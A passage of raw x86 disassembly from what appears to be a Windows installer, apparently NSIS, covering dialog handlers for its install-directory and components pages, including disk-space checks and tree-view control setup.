  4041ff:	83 ec 48             	sub    $0x48,%esp
  404202:	a1 b0 97 42 00       	mov    0x4297b0,%eax
  404207:	53                   	push   %ebx
  404208:	56                   	push   %esi
  404209:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40420c:	8b 70 3c             	mov    0x3c(%eax),%esi
  40420f:	8b 40 38             	mov    0x38(%eax),%eax
  404212:	c1 e6 0a             	shl    $0xa,%esi
  404215:	81 c6 00 f0 42 00    	add    $0x42f000,%esi
  40421b:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404222:	57                   	push   %edi
  404223:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404226:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  40422b:	75 0d                	jne    0x40423a
  40422d:	56                   	push   %esi
  40422e:	53                   	push   %ebx
  40422f:	e8 7d 10 00 00       	call   0x4052b1
  404234:	56                   	push   %esi
  404235:	e8 34 1a 00 00       	call   0x405c6e
  40423a:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404241:	75 72                	jne    0x4042b5
  404243:	8b 7d 08             	mov    0x8(%ebp),%edi
  404246:	53                   	push   %ebx
  404247:	57                   	push   %edi
  404248:	ff 15 2c 72 40 00    	call   *0x40722c
  40424e:	56                   	push   %esi
  40424f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404252:	e8 15 13 00 00       	call   0x40556c
  404257:	85 c0                	test   %eax,%eax
  404259:	74 10                	je     0x40426b
  40425b:	56                   	push   %esi
  40425c:	e8 32 13 00 00       	call   0x405593
  404261:	85 c0                	test   %eax,%eax
  404263:	75 06                	jne    0x40426b
  404265:	56                   	push   %esi
  404266:	e8 94 12 00 00       	call   0x4054ff
  40426b:	56                   	push   %esi
  40426c:	89 3d 38 e3 42 00    	mov    %edi,0x42e338
  404272:	ff 75 f8             	push   -0x8(%ebp)
  404275:	ff 15 f4 71 40 00    	call   *0x4071f4
  40427b:	8b 45 14             	mov    0x14(%ebp),%eax
  40427e:	ff 70 34             	push   0x34(%eax)
  404281:	6a 01                	push   $0x1
  404283:	57                   	push   %edi
  404284:	e8 35 fb ff ff       	call   0x403dbe
  404289:	8b 45 14             	mov    0x14(%ebp),%eax
  40428c:	ff 70 30             	push   0x30(%eax)
  40428f:	6a 14                	push   $0x14
  404291:	57                   	push   %edi
  404292:	e8 27 fb ff ff       	call   0x403dbe
  404297:	ff 75 f8             	push   -0x8(%ebp)
  40429a:	e8 54 fb ff ff       	call   0x403df3
  40429f:	6a 07                	push   $0x7
  4042a1:	e8 88 1a 00 00       	call   0x405d2e
  4042a6:	85 c0                	test   %eax,%eax
  4042a8:	0f 84 6e 02 00 00    	je     0x40451c
  4042ae:	6a 01                	push   $0x1
  4042b0:	ff 75 f8             	push   -0x8(%ebp)
  4042b3:	ff d0                	call   *%eax
  4042b5:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4042bc:	0f 85 cf 00 00 00    	jne    0x404391
  4042c2:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4042c6:	3b c3                	cmp    %ebx,%eax
  4042c8:	75 18                	jne    0x4042e2
  4042ca:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4042cd:	c1 e9 10             	shr    $0x10,%ecx
  4042d0:	66 81 f9 00 03       	cmp    $0x300,%cx
  4042d5:	0f 85 41 02 00 00    	jne    0x40451c
  4042db:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4042e2:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  4042e7:	0f 85 a4 00 00 00    	jne    0x404391
  4042ed:	6a 07                	push   $0x7
  4042ef:	33 c0                	xor    %eax,%eax
  4042f1:	59                   	pop    %ecx
  4042f2:	8d 7d bc             	lea    -0x44(%ebp),%edi
  4042f5:	ff 75 fc             	push   -0x4(%ebp)
  4042f8:	f3 ab                	rep stos %eax,%es:(%edi)
  4042fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4042fd:	bf e0 9f 42 00       	mov    $0x429fe0,%edi
  404302:	68 b0 93 42 00       	push   $0x4293b0
  404307:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40430a:	89 7d c0             	mov    %edi,-0x40(%ebp)
  40430d:	c7 45 cc 31 45 40 00 	movl   $0x404531,-0x34(%ebp)
  404314:	89 75 d0             	mov    %esi,-0x30(%ebp)
  404317:	e8 12 17 00 00       	call   0x405a2e
  40431c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40431f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404322:	50                   	push   %eax
  404323:	c7 45 c8 41 00 00 00 	movl   $0x41,-0x38(%ebp)
  40432a:	ff 15 54 71 40 00    	call   *0x407154
  404330:	85 c0                	test   %eax,%eax
  404332:	74 56                	je     0x40438a
  404334:	50                   	push   %eax
  404335:	ff 15 78 72 40 00    	call   *0x407278
  40433b:	56                   	push   %esi
  40433c:	e8 be 11 00 00       	call   0x4054ff
  404341:	a1 70 eb 42 00       	mov    0x42eb70,%eax
  404346:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  40434c:	85 c0                	test   %eax,%eax
  40434e:	74 28                	je     0x404378
  404350:	81 fe 00 44 43 00    	cmp    $0x434400,%esi
  404356:	75 20                	jne    0x404378
  404358:	50                   	push   %eax
  404359:	6a 00                	push   $0x0
  40435b:	e8 ce 16 00 00       	call   0x405a2e
  404360:	57                   	push   %edi
  404361:	bf 00 db 42 00       	mov    $0x42db00,%edi
  404366:	57                   	push   %edi
  404367:	ff 15 f0 70 40 00    	call   *0x4070f0
  40436d:	85 c0                	test   %eax,%eax
  40436f:	74 07                	je     0x404378
  404371:	57                   	push   %edi
  404372:	56                   	push   %esi
  404373:	e8 b0 16 00 00       	call   0x405a28
  404378:	ff 05 cc 9f 42 00    	incl   0x429fcc
  40437e:	56                   	push   %esi
  40437f:	53                   	push   %ebx
  404380:	ff 75 08             	push   0x8(%ebp)
  404383:	e8 23 0f 00 00       	call   0x4052ab
  404388:	eb 07                	jmp    0x404391
  40438a:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404391:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404398:	74 0d                	je     0x4043a7
  40439a:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4043a1:	0f 85 75 01 00 00    	jne    0x40451c
  4043a7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4043ab:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4043af:	56                   	push   %esi
  4043b0:	53                   	push   %ebx
  4043b1:	e8 fb 0e 00 00       	call   0x4052b1
  4043b6:	56                   	push   %esi
  4043b7:	e8 24 12 00 00       	call   0x4055e0
  4043bc:	85 c0                	test   %eax,%eax
  4043be:	75 07                	jne    0x4043c7
  4043c0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4043c7:	bf a8 8f 42 00       	mov    $0x428fa8,%edi
  4043cc:	56                   	push   %esi
  4043cd:	57                   	push   %edi
  4043ce:	e8 39 16 00 00       	call   0x405a0c
  4043d3:	33 db                	xor    %ebx,%ebx
  4043d5:	53                   	push   %ebx
  4043d6:	e8 53 19 00 00       	call   0x405d2e
  4043db:	3b c3                	cmp    %ebx,%eax
  4043dd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4043e0:	74 35                	je     0x404417
  4043e2:	33 c0                	xor    %eax,%eax
  4043e4:	3b c7                	cmp    %edi,%eax
  4043e6:	74 2d                	je     0x404415
  4043e8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4043eb:	50                   	push   %eax
  4043ec:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4043ef:	50                   	push   %eax
  4043f0:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4043f3:	50                   	push   %eax
  4043f4:	57                   	push   %edi
  4043f5:	ff 55 f4             	call   *-0xc(%ebp)
  4043f8:	85 c0                	test   %eax,%eax
  4043fa:	75 6c                	jne    0x404468
  4043fc:	85 db                	test   %ebx,%ebx
  4043fe:	74 03                	je     0x404403
  404400:	66 21 03             	and    %ax,(%ebx)
  404403:	57                   	push   %edi
  404404:	e8 3d 11 00 00       	call   0x405546
  404409:	8b d8                	mov    %eax,%ebx
  40440b:	4b                   	dec    %ebx
  40440c:	3b df                	cmp    %edi,%ebx
  40440e:	66 c7 03 5c 00       	movw   $0x5c,(%ebx)
  404413:	75 d3                	jne    0x4043e8
  404415:	33 db                	xor    %ebx,%ebx
  404417:	56                   	push   %esi
  404418:	57                   	push   %edi
  404419:	e8 ee 15 00 00       	call   0x405a0c
  40441e:	57                   	push   %edi
  40441f:	e8 6f 11 00 00       	call   0x405593
  404424:	3b c3                	cmp    %ebx,%eax
  404426:	74 03                	je     0x40442b
  404428:	80 20 00             	andb   $0x0,(%eax)
  40442b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40442e:	50                   	push   %eax
  40442f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404432:	50                   	push   %eax
  404433:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404436:	50                   	push   %eax
  404437:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40443a:	50                   	push   %eax
  40443b:	57                   	push   %edi
  40443c:	ff 15 bc 70 40 00    	call   *0x4070bc
  404442:	85 c0                	test   %eax,%eax
  404444:	74 3a                	je     0x404480
  404446:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404449:	be 00 04 00 00       	mov    $0x400,%esi
  40444e:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  404452:	56                   	push   %esi
  404453:	ff 75 f4             	push   -0xc(%ebp)
  404456:	50                   	push   %eax
  404457:	ff 15 30 71 40 00    	call   *0x407130
  40445d:	8b f8                	mov    %eax,%edi
  40445f:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404466:	eb 20                	jmp    0x404488
  404468:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40446b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40446e:	0f ac c7 0a          	shrd   $0xa,%eax,%edi
  404472:	c1 e8 0a             	shr    $0xa,%eax
  404475:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40447c:	33 db                	xor    %ebx,%ebx
  40447e:	eb 03                	jmp    0x404483
  404480:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404483:	be 00 04 00 00       	mov    $0x400,%esi
  404488:	6a 05                	push   $0x5
  40448a:	e8 bd 01 00 00       	call   0x40464c
  40448f:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  404492:	74 0b                	je     0x40449f
  404494:	3b f8                	cmp    %eax,%edi
  404496:	73 07                	jae    0x40449f
  404498:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40449f:	8b 0d 3c e3 42 00    	mov    0x42e33c,%ecx
  4044a5:	39 59 10             	cmp    %ebx,0x10(%ecx)
  4044a8:	74 2b                	je     0x4044d5
  4044aa:	50                   	push   %eax
  4044ab:	6a fb                	push   $0xfffffffb
  4044ad:	68 ff 03 00 00       	push   $0x3ff
  4044b2:	e8 e0 00 00 00       	call   0x404597
  4044b7:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4044ba:	74 0b                	je     0x4044c7
  4044bc:	57                   	push   %edi
  4044bd:	6a fc                	push   $0xfffffffc
  4044bf:	56                   	push   %esi
  4044c0:	e8 d2 00 00 00       	call   0x404597
  4044c5:	eb 0e                	jmp    0x4044d5
  4044c7:	68 98 8f 42 00       	push   $0x428f98
  4044cc:	56                   	push   %esi
  4044cd:	ff 75 08             	push   0x8(%ebp)
  4044d0:	e8 d6 0d 00 00       	call   0x4052ab
  4044d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044d8:	3b c3                	cmp    %ebx,%eax
  4044da:	a3 04 ec 42 00       	mov    %eax,0x42ec04
  4044df:	75 0a                	jne    0x4044eb
  4044e1:	6a 07                	push   $0x7
  4044e3:	e8 23 cf ff ff       	call   0x40140b
  4044e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044eb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4044ee:	85 70 14             	test   %esi,0x14(%eax)
  4044f1:	74 03                	je     0x4044f6
  4044f3:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4044f6:	33 c0                	xor    %eax,%eax
  4044f8:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  4044fb:	0f 94 c0             	sete   %al
  4044fe:	50                   	push   %eax
  4044ff:	e8 dc f8 ff ff       	call   0x403de0
  404504:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  404507:	75 0d                	jne    0x404516
  404509:	39 1d cc 9f 42 00    	cmp    %ebx,0x429fcc
  40450f:	75 05                	jne    0x404516
  404511:	e8 7b fc ff ff       	call   0x404191
  404516:	89 1d cc 9f 42 00    	mov    %ebx,0x429fcc
  40451c:	ff 75 14             	push   0x14(%ebp)
  40451f:	ff 75 10             	push   0x10(%ebp)
  404522:	ff 75 0c             	push   0xc(%ebp)
  404525:	e8 fb f8 ff ff       	call   0x403e25
  40452a:	5f                   	pop    %edi
  40452b:	5e                   	pop    %esi
  40452c:	5b                   	pop    %ebx
  40452d:	c9                   	leave
  40452e:	c2 10 00             	ret    $0x10
  404531:	55                   	push   %ebp
  404532:	8b ec                	mov    %esp,%ebp
  404534:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404538:	56                   	push   %esi
  404539:	8b 35 44 72 40 00    	mov    0x407244,%esi
  40453f:	75 1c                	jne    0x40455d
  404541:	ff 75 14             	push   0x14(%ebp)
  404544:	68 fb 03 00 00       	push   $0x3fb
  404549:	e8 63 0d 00 00       	call   0x4052b1
  40454e:	ff 75 14             	push   0x14(%ebp)
  404551:	6a 01                	push   $0x1
  404553:	68 66 04 00 00       	push   $0x466
  404558:	ff 75 08             	push   0x8(%ebp)
  40455b:	ff d6                	call   *%esi
  40455d:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404561:	75 2d                	jne    0x404590
  404563:	ff 75 14             	push   0x14(%ebp)
  404566:	ff 75 10             	push   0x10(%ebp)
  404569:	ff 15 50 71 40 00    	call   *0x407150
  40456f:	85 c0                	test   %eax,%eax
  404571:	74 0e                	je     0x404581
  404573:	6a 07                	push   $0x7
  404575:	e8 91 ce ff ff       	call   0x40140b
  40457a:	85 c0                	test   %eax,%eax
  40457c:	75 03                	jne    0x404581
  40457e:	40                   	inc    %eax
  40457f:	eb 02                	jmp    0x404583
  404581:	33 c0                	xor    %eax,%eax
  404583:	50                   	push   %eax
  404584:	6a 00                	push   $0x0
  404586:	68 65 04 00 00       	push   $0x465
  40458b:	ff 75 08             	push   0x8(%ebp)
  40458e:	ff d6                	call   *%esi
  404590:	33 c0                	xor    %eax,%eax
  404592:	5e                   	pop    %esi
  404593:	5d                   	pop    %ebp
  404594:	c2 10 00             	ret    $0x10
  404597:	55                   	push   %ebp
  404598:	8b ec                	mov    %esp,%ebp
  40459a:	83 ec 40             	sub    $0x40,%esp
  40459d:	53                   	push   %ebx
  40459e:	56                   	push   %esi
  40459f:	8b 75 10             	mov    0x10(%ebp),%esi
  4045a2:	57                   	push   %edi
  4045a3:	6a 14                	push   $0x14
  4045a5:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  4045ab:	5f                   	pop    %edi
  4045ac:	6a dc                	push   $0xffffffdc
  4045ae:	5b                   	pop    %ebx
  4045af:	73 06                	jae    0x4045b7
  4045b1:	6a 0a                	push   $0xa
  4045b3:	5f                   	pop    %edi
  4045b4:	6a dd                	push   $0xffffffdd
  4045b6:	5b                   	pop    %ebx
  4045b7:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  4045bd:	73 05                	jae    0x4045c4
  4045bf:	6a de                	push   $0xffffffde
  4045c1:	33 ff                	xor    %edi,%edi
  4045c3:	5b                   	pop    %ebx
  4045c4:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  4045ca:	73 0f                	jae    0x4045db
  4045cc:	33 c0                	xor    %eax,%eax
  4045ce:	8b cf                	mov    %edi,%ecx
  4045d0:	40                   	inc    %eax
  4045d1:	6a 14                	push   $0x14
  4045d3:	d3 e0                	shl    %cl,%eax
  4045d5:	59                   	pop    %ecx
  4045d6:	99                   	cltd
  4045d7:	f7 f9                	idiv   %ecx
  4045d9:	03 f0                	add    %eax,%esi
  4045db:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4045de:	6a df                	push   $0xffffffdf
  4045e0:	50                   	push   %eax
  4045e1:	e8 48 14 00 00       	call   0x405a2e
  4045e6:	50                   	push   %eax
  4045e7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4045ea:	53                   	push   %ebx
  4045eb:	50                   	push   %eax
  4045ec:	e8 3d 14 00 00       	call   0x405a2e
  4045f1:	50                   	push   %eax
  4045f2:	8b c6                	mov    %esi,%eax
  4045f4:	25 ff ff ff 00       	and    $0xffffff,%eax
  4045f9:	8b cf                	mov    %edi,%ecx
  4045fb:	6a 0a                	push   $0xa
  4045fd:	33 d2                	xor    %edx,%edx
  4045ff:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404602:	03 c0                	add    %eax,%eax
  404604:	d3 e8                	shr    %cl,%eax
  404606:	59                   	pop    %ecx
  404607:	f7 f1                	div    %ecx
  404609:	8b cf                	mov    %edi,%ecx
  40460b:	d3 ee                	shr    %cl,%esi
  40460d:	52                   	push   %edx
  40460e:	56                   	push   %esi
  40460f:	68 cc 91 40 00       	push   $0x4091cc
  404614:	be e0 9f 42 00       	mov    $0x429fe0,%esi
  404619:	ff 75 0c             	push   0xc(%ebp)
  40461c:	56                   	push   %esi
  40461d:	e8 0c 14 00 00       	call   0x405a2e
  404622:	56                   	push   %esi
  404623:	8b f8                	mov    %eax,%edi
  404625:	e8 f8 13 00 00       	call   0x405a22
  40462a:	03 f8                	add    %eax,%edi
  40462c:	57                   	push   %edi
  40462d:	ff 15 00 72 40 00    	call   *0x407200
  404633:	83 c4 18             	add    $0x18,%esp
  404636:	56                   	push   %esi
  404637:	ff 75 08             	push   0x8(%ebp)
  40463a:	ff 35 38 e3 42 00    	push   0x42e338
  404640:	e8 66 0c 00 00       	call   0x4052ab
  404645:	5f                   	pop    %edi
  404646:	5e                   	pop    %esi
  404647:	5b                   	pop    %ebx
  404648:	c9                   	leave
  404649:	c2 0c 00             	ret    $0xc
  40464c:	8b 15 8c eb 42 00    	mov    0x42eb8c,%edx
  404652:	8b 0d 88 eb 42 00    	mov    0x42eb88,%ecx
  404658:	33 c0                	xor    %eax,%eax
  40465a:	85 d2                	test   %edx,%edx
  40465c:	74 18                	je     0x404676
  40465e:	56                   	push   %esi
  40465f:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404663:	74 07                	je     0x40466c
  404665:	8b 74 24 08          	mov    0x8(%esp),%esi
  404669:	03 04 b1             	add    (%ecx,%esi,4),%eax
  40466c:	81 c1 18 04 00 00    	add    $0x418,%ecx
  404672:	4a                   	dec    %edx
  404673:	75 ea                	jne    0x40465f
  404675:	5e                   	pop    %esi
  404676:	c2 04 00             	ret    $0x4
  404679:	55                   	push   %ebp
  40467a:	8b ec                	mov    %esp,%ebp
  40467c:	83 ec 38             	sub    $0x38,%esp
  40467f:	56                   	push   %esi
  404680:	8b 35 44 72 40 00    	mov    0x407244,%esi
  404686:	57                   	push   %edi
  404687:	8b 7d 08             	mov    0x8(%ebp),%edi
  40468a:	6a 00                	push   $0x0
  40468c:	6a 09                	push   $0x9
  40468e:	68 0a 11 00 00       	push   $0x110a
  404693:	57                   	push   %edi
  404694:	ff d6                	call   *%esi
  404696:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40469a:	74 3c                	je     0x4046d8
  40469c:	ff 15 a0 71 40 00    	call   *0x4071a0
  4046a2:	0f bf c8             	movswl %ax,%ecx
  4046a5:	c1 e8 10             	shr    $0x10,%eax
  4046a8:	0f bf c0             	movswl %ax,%eax
  4046ab:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4046ae:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4046b1:	50                   	push   %eax
  4046b2:	57                   	push   %edi
  4046b3:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4046b6:	ff 15 70 71 40 00    	call   *0x407170
  4046bc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4046bf:	50                   	push   %eax
  4046c0:	6a 00                	push   $0x0
  4046c2:	68 11 11 00 00       	push   $0x1111
  4046c7:	57                   	push   %edi
  4046c8:	ff d6                	call   *%esi
  4046ca:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  4046ce:	75 05                	jne    0x4046d5
  4046d0:	83 c8 ff             	or     $0xffffffff,%eax
  4046d3:	eb 1e                	jmp    0x4046f3
  4046d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4046d8:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4046db:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4046de:	50                   	push   %eax
  4046df:	6a 00                	push   $0x0
  4046e1:	68 0c 11 00 00       	push   $0x110c
  4046e6:	57                   	push   %edi
  4046e7:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  4046ee:	ff d6                	call   *%esi
  4046f0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4046f3:	5f                   	pop    %edi
  4046f4:	5e                   	pop    %esi
  4046f5:	c9                   	leave
  4046f6:	c2 08 00             	ret    $0x8
  4046f9:	55                   	push   %ebp
  4046fa:	8b ec                	mov    %esp,%ebp
  4046fc:	83 ec 50             	sub    $0x50,%esp
  4046ff:	53                   	push   %ebx
  404700:	56                   	push   %esi
  404701:	8b 35 2c 72 40 00    	mov    0x40722c,%esi
  404707:	57                   	push   %edi
  404708:	68 f9 03 00 00       	push   $0x3f9
  40470d:	ff 75 08             	push   0x8(%ebp)
  404710:	ff d6                	call   *%esi
  404712:	68 08 04 00 00       	push   $0x408
  404717:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40471a:	ff 75 08             	push   0x8(%ebp)
  40471d:	ff d6                	call   *%esi
  40471f:	8b 1d 88 eb 42 00    	mov    0x42eb88,%ebx
  404725:	8b 35 44 72 40 00    	mov    0x407244,%esi
  40472b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40472e:	a1 70 eb 42 00       	mov    0x42eb70,%eax
  404733:	05 94 00 00 00       	add    $0x94,%eax
  404738:	33 ff                	xor    %edi,%edi
  40473a:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404741:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404744:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404747:	0f 85 22 02 00 00    	jne    0x40496f
  40474d:	8b 45 08             	mov    0x8(%ebp),%eax
  404750:	6a 02                	push   $0x2
  404752:	a3 c0 eb 42 00       	mov    %eax,0x42ebc0
  404757:	a1 8c eb 42 00       	mov    0x42eb8c,%eax
  40475c:	5b                   	pop    %ebx
  40475d:	89 7d e8             	mov    %edi,-0x18(%ebp)
  404760:	c1 e0 02             	shl    $0x2,%eax
  404763:	50                   	push   %eax
  404764:	6a 40                	push   $0x40
  404766:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404769:	ff 15 00 71 40 00    	call   *0x407100
  40476f:	6a 6e                	push   $0x6e
  404771:	a3 d4 9f 42 00       	mov    %eax,0x429fd4
  404776:	ff 35 60 eb 42 00    	push   0x42eb60
  40477c:	ff 15 a4 71 40 00    	call   *0x4071a4
  404782:	83 0d c8 9f 42 00 ff 	orl    $0xffffffff,0x429fc8
  404789:	68 fa 4c 40 00       	push   $0x404cfa
  40478e:	6a fc                	push   $0xfffffffc
  404790:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404793:	ff 75 fc             	push   -0x4(%ebp)
  404796:	ff 15 30 72 40 00    	call   *0x407230
  40479c:	57                   	push   %edi
  40479d:	6a 06                	push   $0x6
  40479f:	6a 21                	push   $0x21
  4047a1:	6a 10                	push   $0x10
  4047a3:	6a 10                	push   $0x10
  4047a5:	a3 d0 9f 42 00       	mov    %eax,0x429fd0
  4047aa:	ff 15 34 70 40 00    	call   *0x407034
  4047b0:	68 ff 00 ff 00       	push   $0xff00ff
  4047b5:	a3 bc 9f 42 00       	mov    %eax,0x429fbc
  4047ba:	ff 75 ec             	push   -0x14(%ebp)
  4047bd:	50                   	push   %eax
  4047be:	ff 15 28 70 40 00    	call   *0x407028
  4047c4:	ff 35 bc 9f 42 00    	push   0x429fbc
  4047ca:	53                   	push   %ebx
  4047cb:	68 09 11 00 00       	push   $0x1109
  4047d0:	ff 75 fc             	push   -0x4(%ebp)
  4047d3:	ff d6                	call   *%esi
  4047d5:	57                   	push   %edi
  4047d6:	57                   	push   %edi
  4047d7:	68 1c 11 00 00       	push   $0x111c
  4047dc:	ff 75 fc             	push   -0x4(%ebp)
  4047df:	ff d6                	call   *%esi
  4047e1:	83 f8 10             	cmp    $0x10,%eax
  4047e4:	7d 0d                	jge    0x4047f3
  4047e6:	57                   	push   %edi
  4047e7:	6a 10                	push   $0x10
  4047e9:	68 1b 11 00 00       	push   $0x111b
  4047ee:	ff 75 fc             	push   -0x4(%ebp)
  4047f1:	ff d6                	call   *%esi
  4047f3:	ff 75 ec             	push   -0x14(%ebp)
  4047f6:	ff 15 44 70 40 00    	call   *0x407044
  4047fc:	33 db                	xor    %ebx,%ebx
  4047fe:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404801:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  404804:	3b c7                	cmp    %edi,%eax
  404806:	74 27                	je     0x40482f
  404808:	83 fb 20             	cmp    $0x20,%ebx
  40480b:	74 03                	je     0x404810
  40480d:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404810:	50                   	push   %eax
  404811:	57                   	push   %edi
  404812:	e8 17 12 00 00       	call   0x405a2e
  404817:	50                   	push   %eax
  404818:	57                   	push   %edi
  404819:	68 43 01 00 00       	push   $0x143
  40481e:	ff 75 f8             	push   -0x8(%ebp)
  404821:	ff d6                	call   *%esi
  404823:	53                   	push   %ebx
  404824:	50                   	push   %eax
  404825:	68 51 01 00 00       	push   $0x151
  40482a:	ff 75 f8             	push   -0x8(%ebp)
  40482d:	ff d6                	call   *%esi
  40482f:	43                   	inc    %ebx
  404830:	83 fb 21             	cmp    $0x21,%ebx
  404833:	7c c9                	jl     0x4047fe
  404835:	8b 7d 14             	mov    0x14(%ebp),%edi
  404838:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40483b:	ff 74 9f 30          	push   0x30(%edi,%ebx,4)
  40483f:	6a 15                	push   $0x15
  404841:	ff 75 08             	push   0x8(%ebp)
  404844:	e8 75 f5 ff ff       	call   0x403dbe
  404849:	ff 74 9f 34          	push   0x34(%edi,%ebx,4)
  40484d:	6a 16                	push   $0x16
  40484f:	ff 75 08             	push   0x8(%ebp)
  404852:	e8 67 f5 ff ff       	call   0x403dbe
  404857:	33 ff                	xor    %edi,%edi
  404859:	33 db                	xor    %ebx,%ebx
  40485b:	39 3d 8c eb 42 00    	cmp    %edi,0x42eb8c
  404861:	0f 8e c4 00 00 00    	jle    0x40492b
  404867:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40486a:	8d 50 08             	lea    0x8(%eax),%edx
  40486d:	89 55 ec             	mov    %edx,-0x14(%ebp)
  404870:	8d 42 10             	lea    0x10(%edx),%eax
  404873:	80 38 00             	cmpb   $0x0,(%eax)
  404876:	0f 84 90 00 00 00    	je     0x40490c
  40487c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40487f:	8b 02                	mov    (%edx),%eax
  404881:	6a 20                	push   $0x20
  404883:	8b d0                	mov    %eax,%edx
  404885:	59                   	pop    %ecx
  404886:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  404889:	23 d1                	and    %ecx,%edx
  40488b:	c7 45 b4 02 00 ff ff 	movl   $0xffff0002,-0x4c(%ebp)
  404892:	a8 02                	test   $0x2,%al
  404894:	c7 45 b8 0d 00 00 00 	movl   $0xd,-0x48(%ebp)
  40489b:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  40489e:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4048a1:	89 55 c0             	mov    %edx,-0x40(%ebp)
  4048a4:	74 38                	je     0x4048de
  4048a6:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4048a9:	c7 45 b8 4d 00 00 00 	movl   $0x4d,-0x48(%ebp)
  4048b0:	50                   	push   %eax
  4048b1:	6a 00                	push   $0x0
  4048b3:	68 00 11 00 00       	push   $0x1100
  4048b8:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  4048bf:	ff 75 fc             	push   -0x4(%ebp)
  4048c2:	ff d6                	call   *%esi
  4048c4:	8b 0d d4 9f 42 00    	mov    0x429fd4,%ecx
  4048ca:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  4048d1:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  4048d4:	a1 d4 9f 42 00       	mov    0x429fd4,%eax
  4048d9:	8b 1c b8             	mov    (%eax,%edi,4),%ebx
  4048dc:	eb 2e                	jmp    0x40490c
  4048de:	a8 04                	test   $0x4,%al
  4048e0:	74 11                	je     0x4048f3
  4048e2:	53                   	push   %ebx
  4048e3:	6a 03                	push   $0x3
  4048e5:	68 0a 11 00 00       	push   $0x110a
  4048ea:	ff 75 fc             	push   -0x4(%ebp)
  4048ed:	ff d6                	call   *%esi
  4048ef:	8b d8                	mov    %eax,%ebx
  4048f1:	eb 19                	jmp    0x40490c
  4048f3:	8d 45 b0             	lea    -0x50(%ebp),%eax
